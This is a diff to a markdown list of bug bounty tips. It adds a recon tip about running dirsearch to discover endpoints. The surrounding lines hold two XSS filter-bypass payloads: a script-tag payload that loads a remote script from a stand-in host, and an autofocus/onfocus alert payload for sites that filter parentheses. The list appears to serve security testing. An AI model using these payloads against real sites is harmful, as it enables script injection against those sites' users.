@@ -1,5 +1,8 @@
 # Bug Bounty Tips
 
+### Recon
+- Don't stop when you see the response forbidden/not found on the target you are testing, run dirsearch or any tool you prefer to find endpoints, like recon in [this writup](https://medium.com/bugbountywriteup/900-xss-in-yahoo-recon-wins-65ee6d4bfcbd).
+
 ### XSS
 - I love it when a site creates a filter to 'try' prevent something like XSS (or even certain file extensions from being uploaded:D). In this case, [xss filter bypass: </script><%0dscript%20src=\http://mysite.com/yay.js>](https://www.bugbountynotes.com/forum/viewpost?id=100)
 - Have you ever come across an issue, where you could pop XSS but parenthesis () gets filtered ? this payload ``onfocus="alert`1`"autofocus=`` will bypass that problem.
